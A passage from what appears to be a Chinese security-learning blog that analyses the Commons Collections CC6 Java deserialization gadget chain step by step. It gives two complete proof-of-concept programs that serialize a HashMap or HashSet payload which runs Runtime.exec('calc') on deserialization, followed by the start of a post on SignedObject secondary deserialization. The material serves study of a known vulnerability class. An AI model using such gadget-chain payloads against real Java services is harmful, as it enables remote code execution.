class_">LinkedHashMap</span>();</span><br><span class="line"></span><br><span class="line">    String var10;</span><br><span class="line">    Object var11;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">Iterator</span> <span class="variable">var8</span> <span class="operator">=</span> var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;</span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">var9</span> <span class="operator">=</span> (Map.Entry)var8.next();</span><br><span class="line">        var10 = (String)var9.getKey();</span><br><span class="line">        var11 = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var12</span> <span class="operator">=</span> (Class)var6.get(var10);</span><br><span class="line">        <span class="keyword">if</span> (var12 != <span class="literal">null</span>) &#123;</span><br><span class="line">            var11 = var9.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var12.isInstance(var11) &amp;&amp; !(var11 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var11 = (<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(objectToString(var11))).setMember((Method)var5.members().get(var10));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setType(<span class="built_in">this</span>, var3);</span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(<span class="built_in">this</span>, var7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为c1链在TransformedMap中用了setValue方法这里没有了</p>
<p>至于用c1链Laymap中代理类利用点触发点只能是这里了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Iterator</span> <span class="variable">var8</span> <span class="operator">=</span> var4.entrySet().iterator()</span><br></pre></td></tr></table></figure>

<p>但是在调试过程中发现var4的值被改变了只能另想办法出来Laymap.get()方法了</p>
<p>看了达达师傅的思路,是自己反编译 3.1jar的包,然后全局搜索找到可以用的类</p>
<p>尝试全局搜索map.get而且这个类里面是接了serialzable的接口的</p>
<p>发现有三个类但是重点只看他就行了</p>
<p>org.apache.commons.collections.keyvalue.TiedMapEntry类的getValue⽅法可触发map.get⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.map = map;</span><br><span class="line">    <span class="built_in">this</span>.key = key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getKey</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后看哪里用了这个方法,发现有3处</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> Map.Entry)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Map.<span class="type">Entry</span> <span class="variable">other</span> <span class="operator">=</span> (Map.Entry)obj;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">this</span>.key == <span class="literal">null</span> ? other.getKey() == <span class="literal">null</span> : <span class="built_in">this</span>.key.equals(other.getKey())) &amp;&amp; (value == <span class="literal">null</span> ? other.getValue() == <span class="literal">null</span> : value.equals(other.getValue()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">this</span>.getKey() == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.getKey().hashCode()) ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getKey() + <span class="string">&quot;=&quot;</span> + <span class="built_in">this</span>.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先着⼿hashCode⽅法 我第⼀反应想到了URLDNS链，HashMap.readObejct⽅法最后好像可以⾛到hashCode⽅法，但跟ysoserial给的⼊⼝不⼀样，能否可⾏？</p>
<p>问题1.是在于put函数写了进去会发生什么</p>
<p>问题2.如果我像之前分析URLDNS2一样，随便put进去,然后改table能不能做到</p>
<p>但是那样又太麻烦了怎么办,又想像URLDNS先传值,后改值就好了</p>
<p>因为调用了lazymap,transform方法，导致put时候就开始弹计算器了,要是我一开始弄的是一个转化器让程序不报错,后面再改他的值是不是可行的</p>
<p>如果看不懂链子希望还是重新回去看cc1链和URLDNS链子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 初始化 HashMap</span></span><br><span class="line">            HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建 ChainedTransformer</span></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建一个空的 ChainedTransformer</span></span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">fakeChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建 LazyMap 并引入 TiedMapEntry</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), fakeChain);</span><br><span class="line">            <span class="type">TiedMapEntry</span> <span class="variable">entry</span>   <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;baicany&quot;</span>);</span><br><span class="line"></span><br><span class="line">            hashMap.put(entry, <span class="string">&quot;baiacny&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//用反射再改回真的chain</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            f.set(fakeChain, transformers);</span><br><span class="line">            <span class="comment">//清空由于 hashMap.put 对 LazyMap 造成的影响</span></span><br><span class="line">            lazyMap.clear();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反射调用 HashMap 的 putVal 方法</span></span><br><span class="line"><span class="comment">//		Method[] m = Class.forName(&quot;java.util.HashMap&quot;).getDeclaredMethods();</span></span><br><span class="line"><span class="comment">//		for (Method method : m) &#123;</span></span><br><span class="line"><span class="comment">//			if (&quot;putVal&quot;.equals(method.getName())) &#123;</span></span><br><span class="line"><span class="comment">//				method.setAccessible(true);</span></span><br><span class="line"><span class="comment">//				method.invoke(hashMap, -1, entry, 0, false, true);</span></span><br><span class="line"><span class="comment">//			&#125;</span></span><br><span class="line"><span class="comment">//		&#125;</span></span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.txt&quot;</span>));</span><br><span class="line">                outputStream.writeObject(hashMap);</span><br><span class="line">                outputStream.close();</span><br><span class="line"></span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6.txt&quot;</span>));</span><br><span class="line">                inputStream.readObject();</span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为什么要clean?</p>
<p>因为跟进put的时候发现将key值改变了,clean清楚这个操作,用remove删除这个key也行,来看看put做了什么</p>
<p>调试发现,原来在这一步</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为在我们这个链子中put必会触发hashcode函数，然后也会触发get方法里面的map.put了这样导致了map.key里面有baicany这个key,如果不删除的话就会导致，反序列化的时候这里的if判断为true了</p>
<p>然后进入了下面 map.get(key);就调用的是hashmap的方法了</p>
<h1 id="Hashset"><a href="#Hashset" class="headerlink" title="Hashset"></a>Hashset</h1><p>ysoserial介绍了java.util.HashSet作为反序列化的⼊⼝，java.util.HashSet.readObject⽅法的最后会触发map.put⽅法</p>
<p>HashSet 是一个无序的，不允许有重复元素的集合。HashSet 本质上就是由 HashMap 实现的。HashSet 中的元素都存放在 HashMap 的 key 上面，而 value 中的值都是统一的一个<code>private static final Object PRESENT = new Object();</code>。HashSet 跟 HashMap 一样，都是一个存放链表的数组。</p>
<p>在 HashSet 的 readObject 方法中，会调用其内部 HashMap 的 put 方法，将值放在 key 上。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">    map.put(e, PRESENT);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为什么想到put,因为之前hashmap的函数还记得我们之前put方法会干嘛吗也会进入putval方法来触发hashcode</p>
<p>所以来想想怎么用这个方法了,怎么想办法把这里map变为Hashmap是第一步,</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> HashMap&lt;E,Object&gt; map;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HashSet</span><span class="params">()</span> &#123;</span><br><span class="line">      map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">  &#125;发现了map初始化确实是hashmap</span><br></pre></td></tr></table></figure>

<p>发现是 transient属性,所以就算能初始化值反序列也没用了,所以看看序列化的时候有没有写值进去</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">    <span class="comment">// Write out any hidden serialization magic</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line">    <span class="comment">// Write out HashMap capacity and load factor</span></span><br><span class="line">    s.writeInt(map.capacity());</span><br><span class="line">    s.writeFloat(map.loadFactor());</span><br><span class="line">    <span class="comment">// Write out size</span></span><br><span class="line">    s.writeInt(map.size());</span><br><span class="line">    <span class="comment">// Write out all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (E e : map.keySet())</span><br><span class="line">        s.writeObject(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只能说老火</p>
<p>再看看readObject</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">        <span class="comment">// Create backing HashMap</span></span><br><span class="line">        map = (((HashSet&lt;?&gt;)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line">在给定的代码中，根据 HashSet 是否是 LinkedHashSet 的实例，选择创建一个 LinkedHashMap 或 HashMap 的实例作为底层的 HashMap。LinkedHashMap 是 HashMap 的子类，它保留了插入顺序，而普通的 HashMap 则没有保留插入顺序。</span><br></pre></td></tr></table></figure>

<p>发现了这个会返回一个hashmap</p>
<p>所以下一步分析怎么传值了,这里的e怎么弄出来的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();<span class="comment">//有读必也有写</span></span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>来看writeObject</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">for</span> (E e : map.keySet())</span><br><span class="line">        s.writeObject(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以会根据keySet()返回值来写入e,跟进hashmap的keyset</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Set&lt;K&gt; <span class="title function_">keySet</span><span class="params">()</span> &#123;</span><br><span class="line">     Set&lt;K&gt; ks = keySet;</span><br><span class="line">     <span class="keyword">if</span> (ks == <span class="literal">null</span>) &#123;</span><br><span class="line">         ks = <span class="keyword">new</span> <span class="title class_">KeySet</span>();</span><br><span class="line">         keySet = ks;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> ks;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进到最后第一次keySet为null肯定会创造Keyset对象的(自己看)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">KeySet</span> <span class="keyword">extends</span> <span class="title class_">AbstractSet</span>&lt;K&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span>                 &#123; <span class="keyword">return</span> size; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span>               &#123; HashMap.<span class="built_in">this</span>.clear(); &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Iterator&lt;K&gt; <span class="title function_">iterator</span><span class="params">()</span>     &#123; <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">KeyIterator</span>(); &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(Object o)</span> &#123; <span class="keyword">return</span> containsKey(o); &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">remove</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> removeNode(hash(key), key, <span class="literal">null</span>, <span class="literal">false</span>, <span class="literal">true</span>) != <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Spliterator&lt;K&gt; <span class="title function_">spliterator</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">KeySpliterator</span>&lt;&gt;(HashMap.<span class="built_in">this</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">forEach</span><span class="params">(Consumer&lt;? <span class="built_in">super</span> K&gt; action)</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab;</span><br><span class="line">        <span class="keyword">if</span> (action == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">        <span class="keyword">if</span> (size &gt; <span class="number">0</span> &amp;&amp; (tab = table) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mc</span> <span class="operator">=</span> modCount;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tab.length; ++i) &#123;</span><br><span class="line">                <span class="keyword">for</span> (Node&lt;K,V&gt; e = tab[i]; e != <span class="literal">null</span>; e = e.next)</span><br><span class="line">                    action.accept(e.key);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (modCount != mc)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以在wirte的时候for (E e : map.keySet())会进入forEach方法,就是把每个键值给e就对了</p>
<p>但是hashmap add会触发put 那hashset会不会呢也会</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.put(e, PRESENT)==<span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以链子找到了直接写payload</p>
<p>所以只是把之前的payload ,hashcode套了层hashset</p>
<p>开始手搓poc:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 初始化 HashMap</span></span><br><span class="line">            HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建 ChainedTransformer</span></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建一个空的 ChainedTransformer</span></span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">fakeChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建 LazyMap 并引入 TiedMapEntry</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), fakeChain);</span><br><span class="line">            <span class="type">TiedMapEntry</span> <span class="variable">entry</span>   <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;baicany&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">            set.add(entry);</span><br><span class="line">            <span class="comment">//用反射再改回真的chain</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            f.set(fakeChain, transformers);</span><br><span class="line">            <span class="comment">//清空由于 hashMap.put 对 LazyMap 造成的影响</span></span><br><span class="line">            lazyMap.clear();</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.txt&quot;</span>));</span><br><span class="line">                outputStream.writeObject(set);</span><br><span class="line">                outputStream.close();</span><br><span class="line"></span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6.txt&quot;</span>));</span><br><span class="line">                inputStream.readObject();</span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashSet:readObject()-&gt;</span><br><span class="line">    Hashmap:put()-&gt;</span><br><span class="line">        Hashmap:putVal()-&gt;</span><br><span class="line">             TiedMapEntry:hashcode()-&gt;</span><br><span class="line">                 TiedMapEntry:getKey()-&gt;</span><br><span class="line">                     Lazymap:get()-&gt;</span><br><span class="line">                         Transformer...</span><br><span class="line">                         -&gt;exec()</span><br><span class="line">                 </span><br></pre></td></tr></table></figure>

<p>其实学习C1链和URLDNS就觉得很好理解了,都可以脱离文章自己学分析了</p>
<p>依赖版本  commons-collections : 3.1～3.2.1</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>java二次反序列化</title>
    <url>/2023/08/28/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="二次反序列化"><a href="#二次反序列化" class="headerlink" title="二次反序列化"></a>二次反序列化</h1><p>二次反序列化主要是为了绕过绕过黑名单的限制或不出⽹利⽤</p>
<h2 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h2><p>这个类位于java.security包下，是⼀个⽤于创建真实运⾏时对象的类。该类实现了Serializable接⼝</p>
<p>SignedObject包含⼀个要签名的对象及其签名（Serializable对象）。签名对象是对原始对象以序列化的形式深层复制。</p>
<p>其构造⽅法就是对⼀个Serializable对象进⾏⼀次序列化操作</p>
